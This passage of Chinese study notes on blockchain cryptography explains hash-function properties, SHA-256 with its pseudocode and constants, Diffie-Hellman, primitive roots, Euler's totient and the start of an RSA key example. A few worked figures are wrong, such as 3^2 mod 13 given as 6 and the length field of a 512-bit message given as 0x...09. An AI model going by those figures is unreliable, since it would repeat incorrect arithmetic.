<p>上面的方法是肯定可以找到冲突，把复杂度降低一点，利用生日攻击原理，如果随机挑选2^130+1的输入，有99.8%的概率可以找到冲突。</p>
<blockquote>
<p>生日悖论：生日悖论是指在不少于 23 个人中至少有两人生日相同的概率大于 50%。例如在一个 30 人的小学班级中，存在两人生日相同的概率为 70%。对于 60 人的大班，这种概率要大于 99%。这个数学事实十分反直觉，故称之为一个悖论。生日悖论的数学理论被应用于设计密码学攻击方法——生日攻击。<br>为什么是23呢？通过概率来计算一下。<br>假设房间中有n个人，那么n个人生日全部不相同的概率是:</p>
<p>$1*\frac{364}{365}*\frac{363}{365}*\frac{362}{365}…*\frac{365-n+1}{365}$至少有两个人相同的概率就是1-上述概率，计算得出的n和概率的关系是：</p>
</blockquote>
</li>
</ol>
<blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233988.png" alt="img"></p>
</blockquote>
<p>   抗冲突的应用:</p>
<blockquote>
<p>抗冲突的一个主要应用是信息摘要（message digest）。</p>
<p>对于抗冲突性的哈希函数而言，如果两个输入x和y不同，那么就可以认为H(x)和H(y)不同——否则的话，就违反了抗冲突性。</p>
<p>这个性质就可以做信息摘要。考虑2015年的xcode后门事件，因为国内的开发者从苹果官网下载xcode开发框架速度太慢，所以一些公司的开发人员直接从百度云上下载了某些人“好心”提供的版本。腾讯的安全实验发现很多app出现异常流量后发现源头在于使用的xcode，即使开发人员本身写的代码是正确的，经过篡改的xcode可以将恶意代码链入到app中。所以带来的一个问题是，当我们下载开源的软件使用时，怎么可以保证下载到的软件是官方的而不是经过第三方恶意修改过的呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233990.jpg" alt="v2-307e48ac17cd19c71201191f50eb24af_1440w"></p>
<p>这是mysql的下载页面，可以看到在提供下载链接的同时，提供了MD5散列摘要。如果想要保证安全，可以在第三方下载软件之后，使用同样的算法做一次散列，如果相同，可以放心使用。</p>
</blockquote>
<h3 id="Hiding"><a href="#Hiding" class="headerlink" title="Hiding"></a>Hiding</h3><p><strong>Hiding的意思是如果有哈希函数的输出y，那么不可能找到x，使得h(x)&#x3D;y。</strong></p>
<p>关于hiding的含义前面已经解释过。现在的一个问题是，如果输入值本身是有限的，譬如在一个掷硬币的游戏中，如果扔出来head，那么就计算“head”的哈希值；如果扔出来tail，那么就计算”tail”的哈希值。那么在一次投掷过后，公布哈希值，能知道这次投掷的结果吗？</p>
<p>这个问题的特点是输入值的空间太小，如果想要知道输入是什么，只需要遍历一遍，把所有可能的值计算一下，然后进行比对就行。譬如在这里，只需要算两个值，那么肯定可以知道投掷的结果。所以也就失去了hiding的特点。</p>
<p>如果想对head&#x2F;tail的结果进行隐藏，有什么办法吗？</p>
<p>答案就是通过对简单的”head”和”tail”后面跟上一个随机性较强的串r，这样就能实现hiding。譬如，后面跟上长度为256bit的串，这样因为r的随机性足够强，即使head和tail很简单，也有足够的隐藏性。</p>
<p>hiding的应用:</p>
<blockquote>
<p>commitment（承诺）。承诺的场景，譬如，世界杯预测结果，每个人都把自己预测结果放在信封里，并且封上信封，放在桌上。这相当于做出了一个承诺。然后世界杯结束后，大家拆开信封，看看当初谁预测得最准确。</p>
<p>在密码学中，可以这样计算：</p>
<p>com :&#x3D; commit(msg, nonce), nonce是一个随机的秘密的数字（譬如256位）；然后公开com；相当于把公布了一个密封的信封；大家都知道做出了承诺，但是具体值是什么还没有公开</p>
<p>verify(com,msg,nonce)，如果要检验，则用户提供原始的msg和nonce，通过同样的方法计算，看com是否和commit计算出来的结果相同</p>
<p>（考虑一下，为什么需要一个Nonce？）</p>
<p>这里的commit就可以使用哈希函数来实现。</p>
</blockquote>
<h3 id="puzzle-friendliness"><a href="#puzzle-friendliness" class="headerlink" title="puzzle friendliness"></a>puzzle friendliness</h3><p>对于每一个可能的 n位输出 $y$,如果 $k$是随机性很强的值（譬如长度为256位的随机二进制串），那么找到一个合适的 $x$使得  $H(k||x)&#x3D;y$ 是不可能显著地低于  $2^n$的时间复杂度。</p>
<p>这个特点强调的是，如果给定特殊的哈希结果 $y$，并且输入中有一部分随机性很强的$k$，那么找到输入的另一个部分 $x$ 使得哈希的结果等于$y$，那么就只能依靠暴力搜索。</p>
<p>应用： search puzzle ；区块链中的工作量证明。</p>
<h2 id="哈希算法SHA-256"><a href="#哈希算法SHA-256" class="headerlink" title="哈希算法SHA-$256$"></a>哈希算法SHA-$256$</h2><ol>
<li>512-448 &#x3D; 64  字符串长度限定$2^{64}$, data + 1 + n个0 &#x3D; 448mod512,例如data有440bits,则补一个1,然后补7个零;data有952bits,则补一个1,然后补7个零;data有448bits,则补一个1,然后补511个0;data447bits,则补一个1,不用补0.最后一个块剩下64位,就是$2^x$ &#x3D; len(data),例如data位512bits,则最后64位为0x 0000000000000009</li>
<li>把512bits拆成16*32bits,扩展成64个32bits的w(w[i] :&#x3D; w[i-16] + s0 + w[i-7] + s1),k是64个常量(这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。)</li>
<li>第一轮有8个初始hash值(8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数),然后对这64个无符号型整数进行hash加密,加密64轮,然后会得到8个hash值,这8个hash值作为下一轮的输入.</li>
</ol>
<p>SHA-256是SHA-2中的一个算法。SHA-2，也即第二代安全散列算法（Secure Hash Algorithm 2），由美国国家安全局2001年公布的标准哈希算法，是SHA-1的后继。</p>
<p>SHA-2下包括六个不同的算法标准：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512&#x2F;224、SHA-512&#x2F;256。这些不同的算法使用不同生成摘要的长度 、循环运行的次数，但算法的基本结构是一致的。现在已知SHA-2容易受到长度扩展攻击，所以推荐使用SHA-3来取代它。</p>
<p>对于任意长度的消息，SHA256都产生256bit长的哈希值，也即32字节，或者64位的16进制数，或者8个8位的16机制数 。:)</p>
<p>SHA-256的计算过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233991.jpg" alt="preview"></p>
<p align="center">来自wiki,SHA2的一轮计算</p>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233992.jpg" alt="img"></p>
<p>这里A～H共有8个，初始值分别是</p>
<p>h0 :&#x3D; 0x6a09e667<br>h1 :&#x3D; 0xbb67ae85<br>h2 :&#x3D; 0x3c6ef372<br>h3 :&#x3D; 0xa54ff53a<br>h4 :&#x3D; 0x510e527f<br>h5 :&#x3D; 0x9b05688c<br>h6 :&#x3D; 0x1f83d9ab<br>h7 :&#x3D; 0x5be0cd19</p>
<p>看一下，分别是8个16进制数，所以总共有256位，这个就叫做初始向量（IV）。这8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数。最终生成的哈希值也是这么长，所以，每一轮的计算就是如上图所示，更新这8个值。</p>
<p>那怎么更新呢？</p>
<p><strong>每一轮计算64次。</strong>在上图中可以看到，除了A～H外，有两个输入，分别是 $w_t$和$k_t$ 。也即每一轮中有64个 $w$，以及64个 $k$ 。每个 $w$度为32bit，也即4个字节。64个 $w$来自于哈希函数的输入，也即，对于输入，不论长短，长的就分成每512bit一个块（64个字节），短的补足512bit。这64个字节构成了前16个 $w$,后面的48个 $w$过前面的16个生成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i from <span class="number">16</span> to <span class="number">63</span></span><br><span class="line">        s0 := (w[i<span class="number">-15</span>] rightrotate <span class="number">7</span>) xor (w[i<span class="number">-15</span>] rightrotate <span class="number">18</span>) xor (w[i<span class="number">-15</span>] rightshift <span class="number">3</span>)</span><br><span class="line">        s1 := (w[i<span class="number">-2</span>] rightrotate <span class="number">17</span>) xor (w[i<span class="number">-2</span>] rightrotate <span class="number">19</span>) xor (w[i<span class="number">-2</span>] rightshift <span class="number">10</span>)</span><br><span class="line">        w[i] := w[i<span class="number">-16</span>] + s0 + w[i<span class="number">-7</span>] + s1</span><br></pre></td></tr></table></figure>



<p><strong>64个 $k$是64个常量</strong>，</p>
<p>k[0..63] :&#x3D;<br>0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,<br>0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,<br>0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</p>
<p>这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。</p>
<p>然后每一次的计算，</p>
<p>h :&#x3D; g<br>g :&#x3D; f<br>f :&#x3D; e<br>e :&#x3D; d <strong>+</strong> temp1<br>d :&#x3D; c<br>c :&#x3D; b<br>b :&#x3D; a<br>a :&#x3D; temp1 <strong>+</strong> temp2</p>
<p>可以看下伪代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize variables</span><br><span class="line">(first 32 bits of the fractional parts of the square roots of the first 8 primes 2..19):</span><br><span class="line">h0 := 0x6a09e667</span><br><span class="line">h1 := 0xbb67ae85</span><br><span class="line">h2 := 0x3c6ef372</span><br><span class="line">h3 := 0xa54ff53a</span><br><span class="line">h4 := 0x510e527f</span><br><span class="line">h5 := 0x9b05688c</span><br><span class="line">h6 := 0x1f83d9ab</span><br><span class="line">h7 := 0x5be0cd19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize table of round constants</span><br><span class="line">(first 32 bits of the fractional parts of the cube roots of the first 64 primes 2..311):</span><br><span class="line">k[0..63] :=</span><br><span class="line">   0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">   0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">   0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">   0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">   0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">   0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">   0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">   0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[0..15]</span><br><span class="line"></span><br><span class="line">    Extend the sixteen 32-bit words into sixty-four 32-bit words:</span><br><span class="line">    for i from 16 to 63</span><br><span class="line">        s0 := (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor(w[i-15] rightshift 3)</span><br><span class="line">        s1 := (w[i-2] rightrotate 17) xor (w[i-2] rightrotate 19) xor(w[i-2] rightshift 10)</span><br><span class="line">        w[i] := w[i-16] + s0 + w[i-7] + s1</span><br><span class="line"></span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    f := h5</span><br><span class="line">    g := h6</span><br><span class="line">    h := h7</span><br><span class="line"></span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 63</span><br><span class="line">        s0 := (a rightrotate 2) xor (a rightrotate 13) xor(a rightrotate 22)</span><br><span class="line">        maj := (a and b) xor (a and c) xor(b and c)</span><br><span class="line">        t2 := s0 + maj</span><br><span class="line">        s1 := (e rightrotate 6) xor (e rightrotate 11) xor(e rightrotate 25)</span><br><span class="line">        ch := (e and f) xor ((not e) and g)</span><br><span class="line">        t1 := h + s1 + ch + k[i] + w[i]</span><br><span class="line">        h := g</span><br><span class="line">        g := f</span><br><span class="line">        f := e</span><br><span class="line">        e := d + t1</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := a</span><br><span class="line">        a := t1 + t2</span><br><span class="line"></span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">    h5 := h5 + f</span><br><span class="line">    h6 := h6 + g</span><br><span class="line">    h7 := h7 + h</span><br><span class="line"></span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4 append h5 append h6 append h7</span><br></pre></td></tr></table></figure>

<p>关于短的输入如何补足也有一些细节，在输入末尾进行填充，使输入长度在对512取模以后的余数是448。填充的具体过程：先补第一个比特为1，然后都补0，直到长度满足对512取模后余数是448。需要注意的是，信息必须进行填充，也就是说，即使长度已经满足对512取模后余数是448，补位也必须要进行，这时要填充512个比特。因此，填充是至少补一位，最多补512位。为什么余数是448呢?因为，还有需要有64位的数据表示原始输入的长度，加上这64bit的长度信息448+64&#x3D;512，刚好512位。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233993.jpg" alt="preview">Merkle-Damgard构造</p>
<p><strong>在区块链中的应用</strong></p>
<p>哈希在区块链中的用处包括：</p>
<ol>
<li>利用puzzle-friendliness的工作量证明，也即，要求生成一个新区块时，哈希值一定要是以一定数量的连续的0开始的；</li>
<li>对每个区块的内容进行哈希，后面的区块相当于一直在对前面的区块进行哈希，所以一般来说，如果一个区块之后如果跟上其他6个区块之后，一般认为该区块的内容已经被公认了，不可更改。</li>
</ol>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Block_hashing_algorithm">Block hashing algorithm</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=https://lopp.net/pdf/princeton_bitcoin_book.pdf">https://lopp.net/pdf/princeton_bitcoin_book.pdf</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/SHA-2">SHA-2 - Wikipedia</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011583927/article/details/80905740">SHA256算法原理详解 - CSDN博客</a></p>
<h1 id="区块链技术4-密码学指非对称加密"><a href="#区块链技术4-密码学指非对称加密" class="headerlink" title="区块链技术4:密码学指非对称加密"></a>区块链技术4:密码学指非对称加密</h1><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>对称密钥的问题主要在于：</p>
<ol>
<li>共同的密钥的协商。直接的面对面协商可能是不现实的，而任何其他方法都有可能泄露；</li>
<li>密钥的管理。最好对于每个用户的每次通信都使用不同的密钥；</li>
<li>对称加密算法不能提供身份验证，而在电子商务中，用户必须要确认自己隐私数据的接收方是真正的网站；</li>
</ol>
<h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>非对称加密的发展起源于1976年的Diffie-Hellman密钥交换算法。DH实际上并不是一种加密协议，它可以让双方在完全没有对方任何预先信息的条件下通过不安全的信道就密钥达成一致，这个密钥可以在后续的通信中作为对称密钥来加密。</p>
<p>DH算法过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233994.jpg" alt="preview"></p>
<p>DH协商过程，Alice和Bob首先挑选一个颜色（黄色），这个颜色是可以公开的（每次通信不同）；然后再各自挑选一个秘密的颜色（Alice橙色，Bob青色）。然后Alice和Bob各自将自己的秘密颜色和黄色进行混合，得到了另外的两个颜色（Alice橙褐色，Bob淡蓝色）。Alice和Bob分别将自己的颜色发给对方。Alice和Bob在收到对方发来的颜色后，再分别和自己的颜色相混合，此时，两人得到了一个相同的颜色（黄褐色）。</p>
<p>在这个过程中，攻击者Eve可以一直监听网络，并且获得Alice和Bob在网络上交换的所有信息。也即，可以获得黄色、橙褐色、淡蓝色这些信息。阻止Eve获得最终的黄褐色的是Alice和Bob分别挑选的秘密颜色，橙色和青色。也即，需要能够证明，即使Eve得到了黄色和橙褐色，Eve也不能推导出Alice的秘密颜色。</p>
<p>在数学上，DH算法的有效性依赖于计算离散对数的难度。也即，当已知大素数 $p$ 和它的一个原根（primitive root）$g$ ，对于给定的 $b$，要计算指数 $i$，是非常困难的（暴力破解），而给定$i$,计算$b$是非常容易的</p>
<p>再用一个具体的例子来解释DH:</p>
<ol>
<li><p>Alice和Bob通过交流,决定选择素数$p&#x3D;23$以及原根$g&#x3D;5$</p>
</li>
<li><p>Alice选择一个秘密整数$a&#x3D;4$,Bob选择一个秘密整数$b&#x3D;3$</p>
</li>
<li><p>Alice和Bob分别使用$p,g,a$和$b$计算出$A$和$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Alice和Bob分别将这两个数字$A&#x3D;4$和$B&#x3D;10$通过网络发送给对方。</p>
</li>
<li><p>Alice和Bob收到$B$和$A$之后，分别计算：</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>现在Alice和Bob拥有了一个共同的密钥18。而且这个密钥从来没有在网络上传输过</p>
</li>
</ol>
<p>为什么Alice和Bob可以获得共同的公钥呢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>那现在看一下，DH算法可以运行的关键是什么？</p>
<p>即使攻击者Eve可以获得23、5、$A$和$B$，她仍然不能得到Alice和Bob的秘密数字4和3。也即，即使知道 $5^3mod(23)&#x3D;10$这个计算过程中的底数5，模数23和结果10，她依然不能得到指数3。这个就是DH算法所依赖的计算离散对数的难度。（证明计算离散对数很难超纲）</p>
<p>当然我们这里所举的例子非常简单，在实际使用中，必须使用很大的  $p,a,b$。如果 $p$长度为300位，$a$和$b$ 长度为100位，那基本就安全了。</p>
<h4 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h4><p>如果a是素数<em>p</em>的一个原根，那么数值：</p>
<p><em>a</em>mod<em>p</em>，<em>a^2</em> mod<em>p</em>，…，<em>a^(p-1)</em> mod<em>p</em></p>
<p>是各不相同的整数，且以某种排列方式组成了从<em>1</em>到<em>p-1</em>的所有整数。</p>
<p>例子，3是7的原根。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233995.jpg" alt="img">来自wiki</p>
<p>反例：3不是13的原根。<br>$$<br>3^1mod13&#x3D;3<br>\3^2mod13&#x3D;6<br>\3^3mod13&#x3D;1<br>\3^4mod13&#x3D;3<br>\3^5mod13&#x3D;9<br>\3^6mod13&#x3D;1<br>\3^7mod13&#x3D;3<br>$$</p>
<h4 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h4><p>欧拉函数描述的问题是，<strong>任意给定正整数n，在小于等于n的正整数之中，有多少个与n构成互质关系？这个函数一般表示为</strong>$\varphi(n)$。</p>
<p><strong>欧拉函数的通式</strong>：$\varphi(n)&#x3D;n(1-1&#x2F;p1)(1-1&#x2F;p2)(1-1&#x2F;p3)(1-1&#x2F;p4)……(1-1&#x2F;pn)$</p>
<p>其中p1, p2……pn为n的所有质因数(10的质因数是2和5, 4的质因子只有2)，n是不为0的整数。$\varphi(1)&#x3D;1$（唯一和1互质的数就是1本身）。</p>
<p>​                                                   $\varphi(x)&#x3D;x\prod_{i&#x3D;1}^n(1-\frac{1}{p_i})$</p>
<p>$\varphi(10)&#x3D;4$,      因为1,3,7,9和10互质</p>
<p>设m是正整数，a是整数，若a模m的阶等于$\varphi(m)$，则称a为模m的一个原根。对于(a,m)&#x3D;1的整数，满足a^r≡1 (mod m ) 的最小整数r,称为a模m的阶。即$a^{\varphi(m)}\equiv1(modm)$</p>
<p>【m有原根的充要条件是$m&#x3D; 1,2,4,p,2p,p^n$，其中p是奇质数(除2以外的所有质数)，n是任意正整数；也即不是所有的数都有原根】</p>
<p>如果正整数m有原根，那么原根的个数为 $\varphi(\varphi(m))$</p>
<p>另外补充一下欧拉定理。如果整数$a$和$m$互质,那么$a^{\varphi(m)}\equiv1(modm)$ .费马小定理是欧拉定理当$m$ 是素数时的特例。（欧拉定理很有用，在后面RSA中还会出现。）</p>
<p>例1:n &#x3D; 23而言，原根的个数应该是<br>$$<br>\varphi(23)&#x3D;23*(1-\frac{1}{23})&#x3D;22 \<br>\varphi(\varphi(23))&#x3D;\varphi(22)&#x3D;22*(1-\frac{1}{2})*(1-\frac{1}{11})&#x3D;10<br>$$</p>
<p>可以很容易算出，从1~p-1的22个数中，</p>
<p>5, 7, 10, 11, 14, 15, 17, 19, 20, 21共10个数字是23的原根。</p>
<p>例2:n &#x3D; 13而言，原根的个数应该是<br>$$<br>\varphi(13)&#x3D;13*(1-\frac{1}{13})&#x3D;12 \<br>\varphi(\varphi(13))&#x3D;\varphi(12)&#x3D;12*(1-\frac{1}{2})*(1-\frac{1}{3})&#x3D;4<br>$$</p>
<p>可以很容易算出，从1~p-1的12个数中，</p>
<p>2 5 7 11是13的原根</p>
<p>所以这里有一个问题是，为什么在DH算法中，要强调使用的是原根？而不是和 $p$的任意数字？因为根据素数的特性，不论是不是原根，下面的等式总是成立的。</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>这里主要涉及的问题是，破解的难度。</p>
<p>如果使用的g不是p的原根,那么g的所有指数只能生成小于p的整数的一个子集.那么对于攻击者而言,此时即使是暴力破解,需要计算的也只是小于p的整数的子集,而不是小于p的整数全部.</p>
<p>譬如，对于素数13而言，3不是它的原根，(3^1&#x3D;3, 3^2&#x3D;9, 3^3&#x3D;1)mod（13），所以生成的模数只有3个（order），等效的指数也只有3个，降低了攻击者暴力破解的难度。</p>
<p>例如，在DH系统中，如果选择g&#x3D;3，Alice选择了 a&#x3D;7那么对于攻击者Eve而言，本来她需要尝试到7（遍历小于13的全部数字）才能得到 $3^7mod(13)&#x3D;3$；但是实际上，Eve只需要知道 $3^1mod(13)&#x3D;3$就足够了。因为最终的$s&#x3D;[g^{ab}&#x3D;g^{7*b}&#x3D;(g^1)^b]mod(13)$</p>
<p>所以大大降低了DH算法的破解难度。</p>
<p>另外，还需要注意一点，DH算法并没有对双方身份进行验证。当Alice和Bob希望进行通信时，Eve可以很容易地向Alice冒充自己是Bob，以及向Bob冒充自己是Alice，然后分别和Alice和Bob建立公共的对称密钥。然后，Alice到Bob的通信都会通过Eve先使用自己与Alice建立的密钥先解密，获得明文信息之后，再用Eve与Bob建立的密钥加密，传给Bob。Bob到Alice的通信亦然。这样，Alice和Bob会以为自己和对方的通信是加密的，从而是安全的，但是它们的通信会经过Eve加解密一遍。Eve在Alice和Bob之间，拦截他们的通信，并且维持通信，就称为中间人攻击。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233996.jpg" alt="img"></p>
<p>为了防御中间人攻击，就需要一个能够验证通信双方身份的机制来防止这种攻击。</p>
<hr>
<p>补充， $\varphi(n)$的计算.举例来说,$\varphi(10)$计算的是不超过10的自然数中与10互质的数的个数。因为10&#x3D;2*5，也即不超过10的自然数中，所有2的倍数，以及所有5的倍数都不与10互质。所以可以通过减去2的倍数的个数、5的倍数的个数，以及根据容斥原理，再加上同时是2和5的倍数的数字的个数，就可以算出来不超过10的自然数中与10互质的数字的个数。也即，</p>
<p>$10-(10\div2)-(10\div5)+(10\div(2\times5))&#x3D;4$</p>
<p>上面的式子可以改写成：</p>
<p>$10\times(1-\frac{1}{2})\times(1-\frac{1}{5})&#x3D;4$</p>
<p>上面的式子可以进一步理解为：</p>
<p>$\varphi(10)&#x3D;\varphi(2\times5)&#x3D;\varphi(2)\times\varphi(5)$</p>
<p>上面的公式是不是可以扩展为：</p>
<p>$\varphi(p\times q)&#x3D;\varphi(p)\times\varphi(q)$？</p>
<p>上述结论在p 和q没有共同公因子的情况下是可以成立的。但是在p和q共同公因子的情况下则有问题。譬如考虑 $\varphi(8)$的情况。不大于8的自然数中与8互质的数就是去除所有2的倍数的数。因此，</p>
<p>$\varphi(8)&#x3D;8-8\div2&#x3D;8\times(1-\frac{1}{2})$</p>
<p>在上面的计算中，虽然 $8&#x3D;2^3$ ，但是$\varphi(8)$  的计算与次幂无关。因此，如果将8进行分解，譬如，分解成</p>
<p>$\varphi(8)&#x3D;\varphi(2\times4)&#x3D;\varphi(2)*\varphi(4)$</p>
<p>是有问题的。相当于多乘了1&#x2F;2。也即，在质因子有幂乘的情况下，不能将质因子分解到两个乘数中去。这样看来，如果计算$\varphi(100)$，不能将100分解成$10<em>10$，而应该分解为$4</em>25$。这样计算得出</p>
<p>$$\varphi(100)&#x3D;\varphi(4)<em>\varphi(25)&#x3D;2</em>20&#x3D;40$$</p>
<p>同时，$\varphi(p^n)&#x3D;p^n\times(1-\frac{1}{p}&#x3D;p^{n-1}*(p-1))$也可以便于计算。</p>
<h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<br>假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。<br>只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
<h4 id="RSA过程的具体例子"><a href="#RSA过程的具体例子" class="headerlink" title="RSA过程的具体例子"></a>RSA过程的具体例子</h4><ol>
<li><p>挑选两个质数，如 $p&#x3D;61,q&#x3D;53$</p>
</li>
<li><p>计算$n&#x3D;p*q&#x3D;3233$</p>
</li>
<li><p>计算$\varphi(n)&#x3D;\varphi(p)<em>\varphi(q)&#x3D;(p-1)</em>(q-1)&#x3D;3120$【这一步可以计算（p-1）和（q-1）的最小公倍数，从而使得计算的d比较小；17关于780的模逆是413，比2753要小】</p>
</li>
<li><p><strong>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</strong></p>
<p>在1到3120之间，随机选择e&#x3D;17。（实际应用中，常常选择65537。）</p>
</li>
<li><p>计算得出d， 使得d是e关于3120的模逆，得出d &#x3D; 2753（模逆可以使用Euclid扩展算法，证明略）</p>
</li>
<li><p><strong>将n和e封装成公钥，n和d封装成私钥。</strong> </p>
<p>在该例子中，n&#x3D;3233，e&#x3D;17，d&#x3D;2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
</li>
</ol>
<h4 id="RSA算法的可靠性"><a href="#RSA算法的可靠性" class="headerlink" title="RSA算法的可靠性"></a>RSA算法的可靠性</h4><p>回顾密钥生成过程一共出现了6个数字: $p&#x3D;61,q&#x3D;53,n&#x3D;3233,\varphi(n)&#x3D;3120,e&#x3D;17,d&#x3D;2753$</p>
<p>除了公钥的n和e,其余4个数字都是不公开的,在已知n和e的情况下能不能推出d?</p>
<ol>
<li>$e*d mod\varphi(n) &#x3D; 1$ 只有知道$e$和$\varphi(n)$,才能算出$d$,e已知,接下来只需求$\varphi(n)$</li>
